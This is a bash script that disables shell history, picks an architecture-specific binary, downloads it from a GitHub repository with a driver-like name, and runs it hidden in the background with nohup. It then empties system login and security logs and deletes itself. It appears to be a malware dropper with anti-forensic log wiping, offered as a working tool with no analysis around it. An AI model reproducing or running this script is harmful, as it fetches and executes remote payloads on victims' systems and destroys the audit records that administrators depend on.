#!/bin/bash

set +o history
#get_arch=`arch`
get_arch=$(uname -m)

if [[ $get_arch =~ "x86_64" ]];then
    echo "this is x86_64(AMD64)"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/amd_x86_64_unix && chmod +x amd_x86_64_unix && nohup ./amd_x86_64_unix > /dev/null 2>&1 &
elif [[ $get_arch =~ "aarch64" ]];then
    echo "this is aarch64"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/arm_aarch64_unix && chmod +x arm_aarch64_unix && nohup ./arm_aarch64_unix > /dev/null 2>&1 &
elif [[ $get_arch =~ "arm64" ]];then
    echo "this is arm64"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/arm_aarch64_unix  && chmod +x arm_aarch64_unix && nohup ./arm_aarch64_unix > /dev/null 2>&1 &
else
    echo "unknown!!"
fi

echo > /var/log/lastlog
echo > /var/log/utmp
#echo > /var/log/wtmp
echo > /var/log/btmp

cat /dev/null >  /var/log/secure

cat /dev/null >  /var/log/message

cat /dev/null > /var/spool/mail/root

rm -rf dev_sbin.sh